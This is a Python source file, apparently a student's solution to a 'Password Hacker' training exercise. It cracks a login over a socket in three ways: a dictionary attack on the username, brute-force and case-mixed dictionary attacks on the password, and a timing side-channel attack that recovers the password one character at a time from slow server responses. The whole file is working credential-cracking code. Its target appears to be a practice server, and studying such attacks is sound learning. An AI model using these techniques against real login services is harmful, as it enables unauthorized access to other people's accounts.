import argparse
import socket
from itertools import chain, product
import string
import json
from _datetime import datetime


def bruteforcegenerator(charset: list[str], maxlength: int) -> [str]:
    """
    Returns a generator that gives every possible combination of characters in a set of characters, the length of those
    combinations will be automatically incremented until max length is achieved.

    :param charset: List with chars
    :param maxlength: Maximum length
    :return: Generator[str, ... , str]
    """
    return (''.join(attempt)
            for attempt in chain.from_iterable(product(charset, repeat=i)
                                               for i in range(1, maxlength + 1)))


def checkresponse(connection: socket, start: datetime) -> int:
    """
    Checks the response of a connection for desired purposes.\n
    Requires manual configuration.

    :param connection: Current connection
    :param start: Time of start for time vulnerability comparison
    :return: An integer for communicating with other functions if any of the results were premeditated
    """
    response = connection.recv(1024)
    end = datetime.now()
    response = json.loads(response.decode())['result']
    if response == 'Wrong login!':
        return 1
    elif (end - start).microseconds >= 90000:
        return 500
    elif response == 'Connection success!':
        return 200
    elif response == 'Too many attempts':
        raise StopIteration('Too many attempts were made')


def charloop(user: str, charset: list, connection: socket, charprevious='') -> str:
    """
    Uses time vulnerability.\n
    Will loop through a set of characters until the server takes too long to respond.\n
    (Meaning a character of the password was found.)\n
    Uses recursion to append the characters until the server returns a successful connection.

    :param user: The already found username
    :param charset: Set of characters
    :param connection: Current connection
    :param charprevious: (For recursion purposes) Previous character found
    :return: String with full password if any is found
    """
    for char in charset:
        attempt = charprevious + char
        data = {"login": user, "password": attempt}
        encoder = json.dumps(data)
        start = datetime.now()
        connection.send(encoder.encode())
        status = checkresponse(connection, start)
        if status == 200:
            return attempt
        elif status == 500:
            return charloop(user, charset, connection, charprevious=attempt)


def stepbystepbruteforce(connection: socket) -> None:
    """
    Calls getuser() to get username, and then calls charloop() to get password.\n
    Prints a json string with both user and password.

    :param connection: Current connection
    :return: None
    """
    alphanum = list(string.ascii_letters + string.digits)
    user = getuser(connection)
    pwd = charloop(user, alphanum, connection)
    data = {"login": user, "password": pwd}
    print(json.dumps(data))


def bruteforce(connection: socket) -> None:
    """
    First gets the username with getuser() and then loops through the bruteforce generator until the response is
    satisfactory.\n
    Prints the successful password.

    :param connection: Current connection
    :return: None
    """
    user = getuser(connection)
    # standard_ascii = [chr(i) for i in range(32, 127)]
    alphanum = list(string.ascii_letters + string.digits)
    for i in range(1, 9):
        for attempt in bruteforcegenerator(alphanum, i):
            data = {"login": user, "password": attempt}
            encoder = json.dumps(data)
            start = datetime.now()
            connection.send(encoder.encode())
            if checkresponse(connection, start) == 200:
                print(attempt)
                return None


def dictionaryattack(connection: socket) -> None:
    """
    Perform a dictionary attack, reading each line from a list of passwords and then mixes the letters,
    both lowercase and uppercase, for realistic matters, using a generator.\n
    When a password gives the correct response from the servers, it then prints a json string
    with the correct user and password.

    :param connection: Current connection
    :return: None
    """
    with open('C:/Users/intel/PycharmProjects/Password Hacker/Password Hacker/task/hacking/passwords.txt', 'r') as f:
        user = getuser(connection)
        for raw_pwd in f:
            clean_pwd = raw_pwd.strip()
            mixed_letters = map(lambda x: ''.join(x), product(*(
                [letter.lower(), letter.upper()] for letter in clean_pwd)))
            for attempt in mixed_letters:
                data = {"login": user, "password": attempt}
                encoder = json.dumps(data)
                start = datetime.now()
                connection.send(encoder.encode())
                if checkresponse(connection, start) == 200:
                    raise TypeError(json.dumps(data))


def getuser(connection: socket) -> str:
    """
    Dictionary attack for the username.\n
    Loops through each line, tries it, and if the response is satisfactory, it will return a string with the correct
    username.

    :param connection: Current connection
    :return: String with the correct username if any is found
    """
    with open('C:/Users/intel/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt', 'r') as f:
        for raw_user in f:
            clean_user = raw_user.strip()
            data = {"login": clean_user, "password": ' '}
            encoder = json.dumps(data)
            start = datetime.now()
            connection.send(encoder.encode())
            if checkresponse(connection, start) != 1:
                return clean_user


def main() -> None:
    """
    Parses the inputs and transfer them to the right functions.\n
    Requires manual configuration.

    :return: None
    """
    parser = argparse.ArgumentParser()
    parser.add_argument('hostname', type=str)
    parser.add_argument('port', type=int, choices=range(0, 65353))
    args = parser.parse_args()
    with socket.socket() as connection:
        address = (args.hostname, args.port)
        connection.connect(address)
        stepbystepbruteforce(connection)


if __name__ == '__main__':
    main()
